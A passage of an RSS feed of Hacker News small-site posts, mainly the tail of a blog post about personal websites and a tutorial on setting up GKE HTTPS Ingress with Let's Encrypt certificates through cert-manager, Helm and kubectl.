  <img alt="rsms.me hover effects." title="rsms.me hover effects." src="https://healeycodes.com/static/3f98abac143b4a634a29dfb50c968083/d00c8/rasmus-hover.png" srcset="https://healeycodes.com/static/3f98abac143b4a634a29dfb50c968083/d00c8/rasmus-hover.png 273w" sizes="(max-width: 273px) 100vw, 273px" loading="lazy">
  </a>
    </span></p>
<p>Even his <a href="https://rsms.me/bad-url">404 page</a> is sharp.</p>
<p>After looking around more, I found a <code>&lt;script&gt;</code> tag that includes <a href="https://rsms.me/res/main.js">main.js</a>, a debug tool that must have been used to develop the grid layout (which I think is based on <a href="https://rsms.me/raster/">rsms/raster</a>). Pressing alt+D or alt+G overlays a system of boxes and dots.</p>
<p><span>
      <a href="https://healeycodes.com/static/5277a17e627e19500b115f94e8664dd1/1075d/rasmus-boxes.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Debug boxes and dots over the post list." title="Debug boxes and dots over the post list." src="https://healeycodes.com/static/5277a17e627e19500b115f94e8664dd1/1075d/rasmus-boxes.png" srcset="https://healeycodes.com/static/5277a17e627e19500b115f94e8664dd1/a8a0d/rasmus-boxes.png 300w,
https://healeycodes.com/static/5277a17e627e19500b115f94e8664dd1/1075d/rasmus-boxes.png 376w" sizes="(max-width: 376px) 100vw, 376px" loading="lazy">
  </a>
    </span></p>
<p>Rasmus’s last post was in 2017 — <a href="https://rsms.me/wasm-intro">Introduction to WebAssembly</a> — but it’s one that I revisit often as it’s a clear and detailed explanation of the technology.</p>
<p>His use of the right arrow symbol (U+2192) as well as the rounded hover effect on titles (e.g. “Projects” and “Thoughts and ideas”) is something that I closely copied for my own website as it is just too perfect.</p>
<p>Like Paul Stamatiou, Rasmus has hundreds of articles and has been blogging for a long time – almost two decades. The earlier posts are more likely to be reblogs, quotes, links, and small thoughts. The kind of things that Twitter is now used for.</p>
<p>Unlike Twitter, the permanence of these small thoughts is poetic. Here, in 2002, a new font is announced next to something like a diary entry without a paragraph break in between:</p>
<blockquote>
<p>I’ve completed a new typeface. It’s a sweet little thing called Hovden Stitch. Yes your guess was correct. It looks like stitches, cross-stitches to be precise. Go get it for your mac or pc right here. Yesterday I hung out on a free festival here in Trollhättan. Laurel Music was great. Paola sucked. Laurel Music is playing …</p></blockquote></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://healeycodes.com/personal-websites-and-internet-writing/">https://healeycodes.com/personal-websites-and-internet-writing/</a></em></p>]]>
            </description>
            <link>https://healeycodes.com/personal-websites-and-internet-writing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25555725</guid>
            <pubDate>Mon, 28 Dec 2020 01:00:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GKE HTTPS Ingress with LetsEncrypt using cert-manager]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25555628">thread link</a>) | @motte
<br/>
December 27, 2020 | https://kosyfrances.github.io/ingress-gce-letsencrypt/ | <a href="https://web.archive.org/web/*/https://kosyfrances.github.io/ingress-gce-letsencrypt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div> <nav> <ul> <li> <a href="https://kosyfrances.github.io/">Home</a> </li> <li> <a href="https://kosyfrances.github.io/blog">Blog</a> </li> <li> <a href="https://kosyfrances.github.io/memoirs">Memoirs</a> </li> <li> <a href="https://kosyfrances.github.io/about">About</a> </li> </ul> </nav>  <p><span> <time datetime="16-03-2020">Monday. March 16, 2020</time> - <span title="Estimated read time"> 10 mins </span> </span></p> <h2 id="introduction">Introduction</h2> <p><a href="https://cloud.google.com/kubernetes-engine">Google Kubernetes Engine (GKE)</a> provides a built-in and managed Ingress controller called GKE Ingress. When you create an Ingress object, the GKE Ingress controller creates a Google Cloud HTTP(S) load balancer and configures it according to the information in the Ingress and its associated Services.</p> <p>This article describes how to setup Ingress for External HTTP(S) Load Balancing, install cert-manager certificate provisioner and setup up a Let’s Encrypt certificate. This was written based on GKE <a href="https://cloud.google.com/kubernetes-engine/docs/release-notes-stable#february_11_2020">v1.14.10-gke.17</a>, <a href="https://cert-manager.io/">cert-manager</a> v0.13 and <a href="https://helm.sh/">Helm</a> v3.</p> <h2 id="prerequisites">Prerequisites</h2> <ul> <li><a href="https://cloud.google.com/kubernetes-engine/docs/how-to/creating-a-cluster">A GKE Kubernetes cluster</a></li> <li><a href="https://helm.sh/docs/intro/install/">Helm</a></li> <li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/">Kubectl</a></li> <li><a href="https://cloud.google.com/compute/docs/ip-addresses/reserve-static-external-ip-address">A global static IP</a> with <a href="https://cloud.google.com/kubernetes-engine/docs/tutorials/configuring-domain-name-static-ip#step_4_configure_your_domain_name_records">DNS configured</a> for your domain for example, as example.your-domain.com. Regional IP addresses do not work with GKE Ingress.</li> </ul> <p>Note that a Service exposed through an Ingress must respond to health checks from the load balancer. According to the <a href="https://cloud.google.com/kubernetes-engine/docs/concepts/ingress#health_checks">docs</a>, your app must either serve a response with an HTTP 200 status to GET requests on the / path, or you can configure an HTTP readiness probe, serving a response with an HTTP 200 status to GET requests on the path specified by the readiness probe.</p> <h2 id="create-a-deployment">Create a deployment</h2> <p>Here is an example of a sample deployment manifest.</p> <div><div><pre><code><span>apiVersion</span><span>:</span> <span>apps/v1</span>
<span>kind</span><span>:</span> <span>Deployment</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>sample-deployment</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>sampleApp</span>
<span>spec</span><span>:</span>
  <span>replicas</span><span>:</span> <span>1</span>
  <span>selector</span><span>:</span>
    <span>matchLabels</span><span>:</span>
      <span>app</span><span>:</span> <span>sampleApp</span>
  <span>template</span><span>:</span>
    <span>metadata</span><span>:</span>
      <span>labels</span><span>:</span>
        <span>app</span><span>:</span> <span>sampleApp</span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span>-</span> <span>name</span><span>:</span> <span>sampleContainer</span>
        <span>image</span><span>:</span> <span>nginx:1.7.9</span>
        <span>ports</span><span>:</span>
        <span>-</span> <span>name</span><span>:</span> <span>http</span>
          <span>containerPort</span><span>:</span> <span>8080</span>
          <span>protocol</span><span>:</span> <span>TCP</span>
        <span>readinessProbe</span><span>:</span>
          <span>httpGet</span><span>:</span>
            <span>path</span><span>:</span> <span>/healthz</span>
            <span>port</span><span>:</span> <span>8080</span>
          <span>initialDelaySeconds</span><span>:</span> <span>5</span>
          <span>periodSeconds</span><span>:</span> <span>5</span>
</code></pre></div></div> <h2 id="create-a-service">Create a service</h2> <p>Here is an example of a sample service manifest.</p> <div><div><pre><code><span>apiVersion</span><span>:</span> <span>v1</span>
<span>kind</span><span>:</span> <span>Service</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>sampleApp-service</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>sampleApp</span>
<span>spec</span><span>:</span>
  <span>type</span><span>:</span> <span>NodePort</span>
  <span>selector</span><span>:</span>
    <span>app</span><span>:</span> <span>sampleApp</span>
  <span>ports</span><span>:</span>
    <span>-</span> <span>name</span><span>:</span> <span>http</span>
      <span>protocol</span><span>:</span> <span>TCP</span>
      <span>port</span><span>:</span> <span>8080</span>
      <span>targetPort</span><span>:</span> <span>8080</span>
</code></pre></div></div> <h2 id="install-cert-manager">Install cert-manager</h2> <p>cert-manager runs within your Kubernetes cluster as a series of deployment resources. It utilizes <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/">CustomResourceDefinitions</a> to configure Certificate Authorities and request certificates. The following steps <a href="https://cert-manager.io/docs/installation/kubernetes/">installs cert-manager</a> on your Kubernetes cluster.</p> <ul> <li>Install the CustomResourceDefinition resources separately. <div><div><pre><code>  kubectl apply <span>--validate</span><span>=</span><span>false</span> <span>\</span>
  <span>-f</span> https://raw.githubusercontent.com/jetstack/cert-manager/v0.13.1/deploy/manifests/00-crds.yaml
</code></pre></div> </div> </li> <li>Create the namespace for cert-manager. <div><div><pre><code>  kubectl create namespace cert-manager
</code></pre></div> </div> </li> <li>Add the Jetstack Helm repository. <div><div><pre><code>  helm repo add jetstack https://charts.jetstack.io
</code></pre></div> </div> </li> <li>Update your local Helm chart repository cache.  </li> <li>Install the cert-manager Helm chart. <div><div><pre><code>  helm <span>install</span> <span>\</span>
    cert-manager jetstack/cert-manager <span>\</span>
    <span>--namespace</span> cert-manager <span>\</span>
    <span>--version</span> v0.13.1
</code></pre></div> </div> </li> <li>Verify the installation. <div><div><pre><code>  <span>$ </span>kubectl get pods <span>--namespace</span> cert-manager
  NAME                                       READY   STATUS    RESTARTS   AGE
  cert-manager-5c6866597-zw7kh               1/1     Running   0          2m
  cert-manager-cainjector-577f6d9fd7-tr77l   1/1     Running   0          2m
  cert-manager-webhook-787858fcdb-nlzsq      1/1     Running   0          2m
</code></pre></div> </div> <p>You should see the cert-manager, cert-manager-cainjector, and cert-manager-webhook pod in a Running state. It may take a minute or so for the TLS assets required for the webhook to function to be provisioned.</p> </li> <li>Create an <a href="https://cert-manager.io/docs/concepts/issuer/">Issuer</a> to test the webhook works okay. <div><div><pre><code>  <span>cat &lt;&lt;EOF &gt; test-resources.yaml</span>
  <span>apiVersion</span><span>:</span> <span>v1</span>
  <span>kind</span><span>:</span> <span>Namespace</span>
  <span>metadata</span><span>:</span>
    <span>name</span><span>:</span> <span>cert-manager-test</span>
  <span>---</span>
  <span>apiVersion</span><span>:</span> <span>cert-manager.io/v1alpha2</span>
  <span>kind</span><span>:</span> <span>Issuer</span>
  <span>metadata</span><span>:</span>
    <span>name</span><span>:</span> <span>test-selfsigned</span>
    <span>namespace</span><span>:</span> <span>cert-manager-test</span>
  <span>spec</span><span>:</span>
    <span>selfSigned</span><span>:</span> <span>{}</span>
  <span>---</span>
  <span>apiVersion</span><span>:</span> <span>cert-manager.io/v1alpha2</span>
  <span>kind</span><span>:</span> <span>Certificate</span>
  <span>metadata</span><span>:</span>
    <span>name</span><span>:</span> <span>selfsigned-cert</span>
    <span>namespace</span><span>:</span> <span>cert-manager-test</span>
  <span>spec</span><span>:</span>
    <span>dnsNames</span><span>:</span>
      <span>-</span> <span>example.com</span>
    <span>secretName</span><span>:</span> <span>selfsigned-cert-tls</span>
    <span>issuerRef</span><span>:</span>
      <span>name</span><span>:</span> <span>test-selfsigned</span>
  <span>EOF</span>
</code></pre></div> </div> </li> <li>Create the test resources. <div><div><pre><code>  kubectl apply <span>-f</span> test-resources.yaml
</code></pre></div> </div> </li> <li>Check the status of the newly created certificate. You may need to wait a few seconds before cert-manager processes the certificate request. <div><div><pre><code>  <span>$ </span>kubectl describe certificate <span>-n</span> cert-manager-test

  ...
  Spec:
    Common Name:  example.com
    Issuer Ref:
      Name:       test-selfsigned
    Secret Name:  selfsigned-cert-tls
  Status:
    Conditions:
      Last Transition Time:  2020-01-29T17:34:30Z
      Message:               Certificate is up to <span>date </span>and has not expired
      Reason:                Ready
      Status:                True
      Type:                  Ready
    Not After:               2020-04-29T17:34:29Z
  Events:
    Type    Reason      Age   From          Message
    <span>----</span>    <span>------</span>      <span>----</span>  <span>----</span>          <span>-------</span>
    Normal  CertIssued  4s    cert-manager  Certificate issued successfully
</code></pre></div> </div> </li> <li>Clean up the test resources. <div><div><pre><code>  kubectl delete <span>-f</span> test-resources.yaml
</code></pre></div> </div> </li> </ul> <p>If all the above steps have completed without error, you are good to go!</p> <h2 id="create-issuer">Create issuer</h2> <p>The Let’s Encrypt production issuer has very strict <a href="https://letsencrypt.org/docs/rate-limits/">rate limits</a>. When you are experimenting and learning, it is very easy to hit those limits, and confuse rate limiting with errors in configuration or operation. Start with <a href="https://letsencrypt.org/docs/staging-environment/">Let’s Encrypt staging</a> environment and switch to Let’s Encrypt production after it works fine. In this article, we will be creating a <a href="https://docs.cert-manager.io/en/release-0.11/reference/clusterissuers.html">ClusterIssuer</a>.</p> <p>Create a clusterissuer definition and update the email address to your own. This email is required by Let’s Encrypt and used to notify you of certificate expiration and updates.</p> <div><div><pre><code><span>cat &lt;&lt;EOF &gt; clusterissuer.yaml</span>
<span>apiVersion</span><span>:</span> <span>cert-manager.io/v1alpha2</span>
<span>kind</span><span>:</span> <span>ClusterIssuer</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>letsencrypt-staging</span>
<span>spec</span><span>:</span>
  <span>acme</span><span>:</span>
    <span># The ACME server URL</span>
    <span>server</span><span>:</span> <span>https://acme-staging-v02.api.letsencrypt.org/directory</span>
    <span># Email address used for ACME registration</span>
    <span>email</span><span>:</span> <span>you@youremail.com</span> <span># Update to yours</span>
    <span># Name of a secret used to store the ACME account private key</span>
    <span>privateKeySecretRef</span><span>:</span>
      <span>name</span><span>:</span> <span>letsencrypt-staging</span>
    <span># Enable the HTTP-01 challenge provider</span>
    <span>solvers</span><span>:</span>
    <span>-</span> <span>http01</span><span>:</span>
        <span>ingress</span><span>:</span>
            <span>class</span><span>:</span> <span>ingress-gce</span>
<span>EOF</span>
</code></pre></div></div> <p>Once edited, apply the custom resource:</p> <div><div><pre><code>kubectl apply <span>-f</span> clusterissuer.yaml
</code></pre></div></div> <p>Check on the status of the clusterissuer after you create it:</p> <div><div><pre><code><span>$ </span>kubectl describe clusterissuer letsencrypt-staging

Name:         letsencrypt-staging
...
Status:
  Acme:
    Last Registered Email:  you@youremail.com
    Uri:                    https://acme-staging-v02.api.letsencrypt.org/acme/acct/123456
  Conditions:
    Last Transition Time:  2020-02-24T18:33:56Z
    Message:               The ACME account was registered with the ACME server
    Reason:                ACMEAccountRegistered
    Status:                True
    Type:                  Ready
Events:                    &lt;none&gt;
</code></pre></div></div> <p>You should see the issuer listed with a registered account.</p> <h2 id="deploy-a-tls-ingress-resource">Deploy a TLS Ingress Resource</h2> <p>Create an <a href="https://kubernetes.io/docs/concepts/services-networking/ingress/">ingress</a> definition.</p> <div><div><pre><code><span>cat &lt;&lt;EOF &gt; ingress.yaml</span>
<span>apiVersion</span><span>:</span> <span>extensions/v1beta1</span>
<span>kind</span><span>:</span> <span>Ingress</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>sampleApp-ingress</span>
  <span>annotations</span><span>:</span>
    <span># specify the name of the global IP address resource to be associated with the HTTP(S) Load Balancer.</span>
    <span>kubernetes.io/ingress.global-static-ip-name</span><span>:</span> <span>sampleApp-ip</span>
    <span># add an annotation indicating the issuer to use.</span>
    <span>cert-manager.io/cluster-issuer</span><span>:</span> <span>letsencrypt-staging</span>
    <span># controls whether the ingress is modified ‘in-place’,</span>
    <span># or a new one is created specifically for the HTTP01 challenge.</span>
    <span>acme.cert-manager.io/http01-edit-in-place</span><span>:</span> <span>"</span><span>true"</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>sampleApp</span>
<span>spec</span><span>:</span>
  <span>tls</span><span>:</span> <span># &lt; placing a host in the TLS config will indicate a certificate should be created</span>
  <span>-</span> <span>hosts</span><span>:</span>
    <span>-</span> <span>example.example.com</span>
    <span>secretName</span><span>:</span> <span>sampleApp-cert-secret</span> <span># &lt; cert-manager will store the created certificate in this secret</span>
  <span>rules</span><span>:</span>
  <span>-</span> <span>host</span><span>:</span> <span>example.example.com</span>
    <span>http</span><span>:</span>
      <span>paths</span><span>:</span>
      <span>-</span> <span>path</span><span>:</span> <span>sample/app/path/*</span>
        <span>backend</span><span>:</span>
          <span>serviceName</span><span>:</span> <span>sampleApp-service</span>
          <span>servicePort</span><span>:</span> <span>8080</span>
<span>EOF</span>
</code></pre></div></div> <p>Once edited, apply ingress resource.</p> <div><div><pre><code>kubectl apply <span>-f</span> ingress.yaml
</code></pre></div></div> <h2 id="verify">Verify</h2> <p>View certificate.</p> <div><div><pre><code><span>$ </span>kubectl get certificate
NAME                    READY     SECRET                AGE
sampleApp-cert-secret   True      sampleApp-cert-secret   6m34s
</code></pre></div></div> <p>Describe certificate.</p> <div><div><pre><code><span>$ </span>kubectl describe certificate sampleApp-cert-secret
Name:         sampleApp-cert-secret
...
Status:
  Conditions:
    Last Transition Time:  2020-03-02T16:30:01Z
    Message:               Certificate is up to <span>date </span>and has not expired
    Reason:                Ready
    Status:                True
    Type:                  Ready
  Not After:               2020-05-24T17:55:46Z
Events:                    &lt;none&gt;
</code></pre></div></div> <p>Describe secrets created by cert manager.</p> <div><div><pre><code><span>$ </span>kubectl describe secret sampleApp-cert-secret

Name:         sampleApp-cert-secret
...
Type:  kubernetes.io/tls

Data
<span>====</span>
ca.crt:   0 bytes
tls.crt:  3598 bytes
tls.key:  1675 bytes
</code></pre></div></div> <h2 id="switch-to-lets-encrypt-prod">Switch to Let’s Encrypt Prod</h2> <p>Now that we are sure that everything is configured correctly, you can update the annotations in the ingress to specify the production issuer:</p> <div><div><pre><code><span>apiVersion</span><span>:</span> <span>extensions/v1beta1</span>
<span>kind</span><span>:</span> <span>Ingress</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>sampleApp-ingress</span>
  <span>annotations</span><span>:</span>
    <span>kubernetes.io/ingress.global-static-ip-name</span><span>:</span> <span>sampleApp-ip</span>
    <span>cert-manager.io/cluster-issuer</span><span>:</span> <span>letsencrypt-prod</span>
    <span>acme.cert-manager.io/http01-edit-in-place</span><span>:</span> <span>"</span><span>true"</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>sampleApp</span>
<span>spec</span><span>:</span>
  <span>tls</span><span>:</span>
  <span>-</span> <span>hosts</span><span>:</span>
    <span>-</span> <span>example.example.com</span>
    <span>secretName</span><span>:</span> <span>sampleApp-cert-secret</span>
  <span>rules</span><span>:</span>
  <span>-</span> <span>host</span><span>:</span> <span>example.example.com</span>
    <span>http</span><span>:</span>
      <span>paths</span><span>:</span>
      <span>-</span> <span>path</span><span>:</span> <span>sample/app/path/*</span>
        <span>backend</span><span>:</span>
          <span>serviceName</span><span>:</span> <span>sampleApp-service</span>
          <span>servicePort</span><span>:</span> <span>8080</span>
</code></pre></div></div> <div><div><pre><code><span>$ </span>kubectl create <span>--edit</span> <span>-f</span> ingress.yaml
ingress.extensions <span>"sampleApp-ingress"</span> configured
</code></pre></div></div> <p>You will also need to delete the existing secret, which cert-manager is watching. This will cause it to reprocess …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kosyfrances.github.io/ingress-gce-letsencrypt/">https://kosyfrances.github.io/ingress-gce-letsencrypt/</a></em></p>]]>
            </description>
            <link>https://kosyfrances.github.io/ingress-gce-letsencrypt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25555628</guid>
            <pubDate>Mon, 28 Dec 2020 00:46:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mobile-First (and why it's a bad idea)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25555623">thread link</a>) | @taphangum
<br/>
December 27, 2020 | https://planflow.dev/blog/why-mobile-first-is-a-bad-idea | <a href="https://web.archive.org/web/*/https://planflow.dev/blog/why-mobile-first-is-a-bad-idea">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://planflow.dev/blog/why-mobile-first-is-a-bad-idea</link>
            <guid isPermaLink="false">hacker-news-small-sites-25555623</guid>
            <pubDate>Mon, 28 Dec 2020 00:46:08 GMT</pubDate>
        </item>
    </channel>
</rss>
